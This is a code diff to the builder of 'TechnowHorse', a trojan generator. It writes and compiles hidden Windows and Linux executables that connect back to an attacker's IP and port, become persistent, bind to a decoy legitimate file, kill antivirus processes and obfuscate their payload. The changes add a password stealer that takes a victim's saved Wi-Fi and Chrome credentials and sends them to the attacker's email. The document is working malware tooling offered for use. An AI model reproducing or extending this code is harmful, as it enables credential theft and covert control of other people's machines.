@@ -12,17 +12,20 @@ BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m'
 
 if platform.system() == 'Windows':
     PYTHON_PYINSTALLER_PATH = os.path.expanduser("C:/Python37-32/Scripts/pyinstaller.exe")
+    Attacker_System = 'Windows'
 elif platform.system() == 'Linux':
+    Attacker_System = 'Linux'
     PYTHON_PYINSTALLER_PATH = os.path.expanduser("~/.wine/drive_c/Python37-32/Scripts/pyinstaller.exe")
 
 def get_options():
-    parser = argparse.ArgumentParser(description=f'{RED}TechnowHorse v1.5')
+    parser = argparse.ArgumentParser(description=f'{RED}TechnowHorse v1.6')
     parser._optionals.title = f"{GREEN}Optional Arguments{YELLOW}"
     parser.add_argument("-w", "--windows", dest="windows", help="Generate a Windows executable.", action='store_true')
     parser.add_argument("-l", "--linux", dest="linux", help="Generate a Linux executable.", action='store_true')
     parser.add_argument("-t", "--persistence", dest="time_persistent", help="Becoming Persistence After __ seconds. default=10", default=10) 
     parser.add_argument("-b", "--bind", dest="bind", help="AutoBinder : Specify Path of Legitimate file.") 
     parser.add_argument("-k", "--kill_av", dest="kill_av", help="AntivirusKiller : Specify AV's .exe which need to be killed. Ex:- --kill_av cmd.exe") 
+    parser.add_argument("-s", "--steal-password", dest="stealer", help=f"Steal Saved Password from Victim Machine [{RED}Supported OS : Windows{YELLOW}]", action='store_true')
 
     required_arguments = parser.add_argument_group(f'{RED}Required Arguments{GREEN}')
     required_arguments.add_argument("--icon", dest="icon", help="Specify Icon Path, Icon of Evil File [Note : Must Be .ico].")    
@@ -59,11 +62,15 @@ def check_dependencies():
 
 def create_trojan(file_name, email, password, ip, port, time_persistent, legitimate_file=None):    
     with open(file_name, "w+") as file:
-        file.write("import payload,  win32event, winerror, win32api\n")
+        file.write("import payload, win32event, winerror, win32api\n")
+        if arguments.stealer:
+            file.write("import password_stealer\n") 
+        if arguments.bind or arguments.stealer:
+            file.write("import threading\n\n")             
 
         if arguments.bind != None:
             #Codes to Run, Legitimate File on Front End            
-            file.write("import threading, subprocess, sys\n\n")        
+            file.write("import subprocess, sys\n\n")        
             file.write("def run_front_file():\n")        
             file.write(f"\tfile_name = sys._MEIPASS.replace('\\\\', '/') + \"/{legitimate_file}\" \n")       
             file.write(f"\tsubprocess.call(file_name, shell=True)\n\n")
@@ -74,12 +81,26 @@ def create_trojan(file_name, email, password, ip, port, time_persistent, legitim
 
         #Below Codes will check for already running instance,
         file.write("\nmutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')\n\n")
+        
+        if arguments.stealer:
+            #Saved Password Stealer 
+            file.write("def steal():\n")
+            file.write(f"\tsteal = password_stealer.SendPass(\'{email}\', \'{password}\')\n")
+            file.write(f"\tsteal.get_wifi_creds()\n")
+            file.write(f"\tprint(\"[+] Wifi Password Send Successfully!\")\n")
+            file.write(f"\tsteal.get_chrome_browser_creds()\n")
+            file.write(f"\tprint(\"[+] Chrome Browser Password Send Successfully!\")\n\n")          
+        
         file.write("def check_and_start():\n")
         file.write("\tif win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:\n")
         file.write("\t\tmutex = None\n")
         file.write("\t\tprint(\"[+] Disabling TechNowHorse: Already Running\")\n")
 
         file.write("\telse:\n")  # if no instance running, going to run TechNowHorse
+        
+        if arguments.stealer:
+            file.write(f"\t\tt2 = threading.Thread(target=steal)\n")    #Making Stealer Thread  
+            file.write(f"\t\tt2.start()\n\n")                           #Starting Thread        
 
         file.write(f"\t\ttechnowHorse = payload.TrojanHorse(\'{email}\', \'{password}\', \'{ip}\', {port})\n")
         if arguments.kill_av != None and arguments.kill_av != "":
@@ -94,11 +115,7 @@ def create_trojan_linux(file_name, email, password, ip, port, time_persistent):
     with open(file_name, "w+") as file:
         file.write("import payload\n")
         
-        file.write(f"technowHorse = payload.TrojanHorse(\'{email}\', \'{password}\', \'{ip}\', {port})\n")
-        if arguments.kill_av != None and arguments.kill_av != "":
-            file.write(f"technowHorse.kill_av({arguments.kill_av})\n") 
-        else:
-            file.write("technowHorse.kill_av()\n")             
+        file.write(f"technowHorse = payload.TrojanHorse(\'{email}\', \'{password}\', \'{ip}\', {port})\n")             
         file.write(f"technowHorse.become_persistent({time_persistent})\n") 
         file.write("technowHorse.start()\n\n")     
                 
@@ -110,8 +127,15 @@ def obfuscating_payload(file_name):
         file.write(text)
         
 def compile_for_windows(file_name):
-    if arguments.bind != None:
+    if arguments.bind != None and arguments.stealer:
+        subprocess.call(f"{PYTHON_PYINSTALLER_PATH} --onefile --noconsole --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=payload --hidden-import=password_stealer {file_name} -i {arguments.icon} --add-data \"{arguments.bind};.\"", shell=True)                
+
+    elif arguments.bind != None:
         subprocess.call(f"{PYTHON_PYINSTALLER_PATH} --onefile --noconsole --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=payload {file_name} -i {arguments.icon} --add-data \"{arguments.bind};.\"", shell=True)
+
+    elif arguments.stealer:
+        subprocess.call(f"{PYTHON_PYINSTALLER_PATH} --onefile --noconsole --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=payload --hidden-import=password_stealer {file_name} -i {arguments.icon}", shell=True)                
+
     else:
         subprocess.call(f"{PYTHON_PYINSTALLER_PATH} --onefile --noconsole --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=payload {file_name} -i {arguments.icon}", shell=True)
 
@@ -138,12 +162,23 @@ def exit_greet():
     try:
         os.system('cls')
     except Exception as e:
-        os.system('clear')        
+        os.system('clear')   
+    del_junk_file(arguments.output)
     print(GREEN + '''Thank You for using TechNowHorse, Think Great & Touch The Sky!  \n''' + END)
     quit()    
 
 if __name__ == '__main__':
-    os.system('rm -Rf dist')
+    if Attacker_System == 'Windows':
+        try:
+            shutil.rmtree(os.getcwd() + "\\dist")
+        except Exception:
+            pass
+    else:
+        try:
+            os.system('rm -Rf dist')
+        except Exception:
+            pass
+        
     try:
         print(banners.get_banner())
         print(f"\t\t{YELLOW}Author: {GREEN}Pushpender | {YELLOW}Website: {GREEN}technowlogy.tk\n")
@@ -187,8 +222,18 @@ if __name__ == '__main__':
         check_dependencies()
 
         print(f"\n{YELLOW}[*] Generating Please wait for a while...{MAGENTA}\n")        
-                
-        create_trojan(arguments.output, arguments.email, arguments.password, arguments.ip, arguments.port, arguments.time_persistent, arguments.bind)
+        
+        if Attacker_System == 'Linux':
+            if arguments.linux:
+                create_trojan_linux(arguments.output, arguments.email, arguments.password, arguments.ip, arguments.port, arguments.time_persistent)
+        
+        if Attacker_System == 'Windows' and arguments.linux:
+            print(f"{RED}[!] Linux payload can't be compiled from windows machine")
+            print(f"{YELLOW}[*] Making Payload for Windows ...\n")
+        
+        if arguments.windows:
+            create_trojan(arguments.output, arguments.email, arguments.password, arguments.ip, arguments.port, arguments.time_persistent, arguments.bind)
+        
         obfuscating_payload(arguments.output)
         
         encrypting_code = encrypt_code.Encrypt()
